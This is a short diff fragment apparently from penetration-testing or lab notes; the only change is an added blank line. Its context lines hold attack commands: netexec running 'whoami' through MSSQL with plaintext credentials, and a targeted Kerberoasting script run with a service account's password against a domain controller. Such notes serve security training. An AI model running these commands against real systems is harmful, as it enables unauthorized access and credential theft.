@@ -70,4 +70,5 @@ nxc mssql -d hokkaido-aerospace.com -u discovery -p 'Start123!' -x "whoami" 192.
 
 source /opt/windows/targetedKerberoast/venv/bin/activate
 python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip
+
 ```
